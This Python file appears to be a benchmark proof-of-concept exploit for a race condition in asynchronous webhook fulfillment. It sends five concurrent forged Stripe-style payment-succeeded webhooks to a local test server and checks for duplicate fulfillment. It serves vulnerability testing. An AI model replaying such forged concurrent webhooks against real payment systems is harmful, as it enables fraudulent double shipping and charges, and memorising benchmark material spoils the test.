"""PoC exploit: TOCTOU race condition in async webhook fulfillment (CWE-362).

After the 3-stage chain:
- Stage 1 implements synchronous webhook handler with order tracking
- Stage 2 adds an idempotency guard: skip if status == "fulfilled"
- Stage 3 moves fulfillment to a background thread, returning 200 immediately

The vulnerability: the idempotency check reads status in the main thread,
but status is only set to "fulfilled" after the background thread completes
the slow fulfillment work (~1 second). During that window, concurrent
webhook retries all see status="pending", all pass the idempotency guard,
and each spawns its own background thread.

Result: N concurrent webhook deliveries for the same payment_intent_id
cause N fulfillments (double shipping, double email, double charges).

The attack is straightforward:
1. Send 5 concurrent POST /webhook requests with the same payment_intent_id
2. Wait for background threads to complete
3. Check GET /orders/<pi_id> — fulfillment_count > 1 confirms the race
"""

import time

from benchmark.chains.poc_templates import ReplayRaceTemplate


class AsyncRaceExploit(ReplayRaceTemplate):
    """TOCTOU race condition in async webhook fulfillment — double fulfillment."""

    def __init__(self, base_url: str = "http://localhost:4242"):
        super().__init__(base_url)
        self._pi_id: str = ""

    @property
    def chain_id(self) -> str:
        return "stripe_async_race"

    def setup(self) -> None:
        """Generate a unique payment intent ID for this test run."""
        import uuid
        self._pi_id = f"pi_race_test_{uuid.uuid4().hex[:12]}"

    def _make_webhook_payload(self) -> dict:
        """Build a mock Stripe webhook event for payment_intent.succeeded."""
        return {
            "id": f"evt_{self._pi_id}",
            "type": "payment_intent.succeeded",
            "data": {
                "object": {
                    "id": self._pi_id,
                    "object": "payment_intent",
                    "amount": 5999,
                    "currency": "usd",
                    "status": "succeeded",
                    "metadata": {},
                }
            },
        }

    def execute(self) -> tuple[bool, str]:
        """Send concurrent webhooks and check for double fulfillment."""
        if not self._pi_id:
            return False, "Setup failed: no payment intent ID"

        payload = self._make_webhook_payload()
        num_concurrent = 5
        def send_webhook(idx: int):
            """Send a single webhook POST in a thread."""
            return self.http_post(
                "/webhook",
                json=payload,
                headers={"Content-Type": "application/json"},
            )

        results, errors = self.concurrent(num_concurrent, send_webhook)

        if errors:
            return False, f"HTTP errors during concurrent requests: {errors}"

        # Count successful webhook deliveries (200 responses)
        success_count = sum(1 for r in results if r and r.ok)
        already_fulfilled_count = sum(
            1 for r in results
            if r and r.ok and "already_fulfilled" in r.text
        )

        # Wait for background threads to complete fulfillment
        # (handle_fulfillment has a time.sleep(1) simulating real work)
        time.sleep(3)

        # Check the order state
        order_resp = self.http_get(f"/orders/{self._pi_id}")

        if not order_resp.ok:
            return False, (
                f"GET /orders/{self._pi_id} returned {order_resp.status_code}. "
                f"The webhook handler may not have created an order entry. "
                f"Webhook responses: {success_count}/{num_concurrent} succeeded, "
                f"{already_fulfilled_count} returned already_fulfilled."
            )

        order = order_resp.json()
        fulfillment_count = order.get("fulfillment_count", 0)
        status = order.get("status", "unknown")

        evidence_parts = [
            f"Sent {num_concurrent} concurrent webhooks for {self._pi_id}.",
            f"Webhook responses: {success_count} accepted, "
            f"{already_fulfilled_count} returned already_fulfilled.",
            f"Order status: {status}, fulfillment_count: {fulfillment_count}.",
        ]

        if fulfillment_count > 1:
            return True, (
                f"TOCTOU race confirmed (CWE-362). "
                f"Double fulfillment detected: fulfillment_count={fulfillment_count} "
                f"(expected 1). The idempotency guard checks status in the main "
                f"thread, but status is only set to 'fulfilled' after the background "
                f"thread completes. Concurrent retries all see 'pending' and each "
                f"spawns a fulfillment thread. "
                + " ".join(evidence_parts)
            )

        # Even fulfillment_count == 1 could mean the race window was missed.
        # Check if multiple webhooks were accepted (not already_fulfilled).
        if already_fulfilled_count == 0 and success_count > 1:
            # All webhooks were accepted but only one fulfillment ran —
            # the race window may be too narrow or threading didn't interleave.
            return False, (
                f"All {success_count} webhooks accepted (none returned "
                f"already_fulfilled), but fulfillment_count={fulfillment_count}. "
                f"The race window may exist but was not triggered this run. "
                + " ".join(evidence_parts)
            )

        return False, (
            f"No double fulfillment detected. "
            f"fulfillment_count={fulfillment_count}. "
            f"Idempotency guard may be working correctly "
            f"(checking before background dispatch). "
            + " ".join(evidence_parts)
        )
